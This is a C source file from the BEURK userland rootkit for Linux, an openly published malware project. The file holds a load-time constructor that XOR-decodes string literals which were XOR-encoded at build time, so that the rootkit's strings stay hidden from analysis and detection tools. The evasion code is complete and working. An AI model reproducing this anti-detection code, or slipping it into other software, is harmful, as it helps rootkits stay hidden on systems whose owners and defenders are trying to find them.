/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <string.h>
#include "beurk.h"

/** xorify a string whith XOR_KEY
 * (XOR_KEY is a macro defined in BEURK config file
 */
static void     xor(char *p) {
    unsigned int i;

    for(i = 0; i < strlen(p); i++) {
        p[i] ^= XOR_KEY;
    }
}

/** re-xorify hidden literals.
 * hidden literals are all string literals used in the library
 * which are xorified before compilagtion in order to prevent
 * string leaking.
 *
 * this function restores clear literals values, as defined in
 * BEURK config file.
 */
static void     init_hidden_literals(void) {
    int     i;

    for (i=0; i<NUM_LITERALS; i++) {
        xor(__hidden_literals[i]);
    }
}

/** library constructor
 */
void            init(void) {
    DEBUG("init() constructor loaded");
    init_hidden_literals();
}
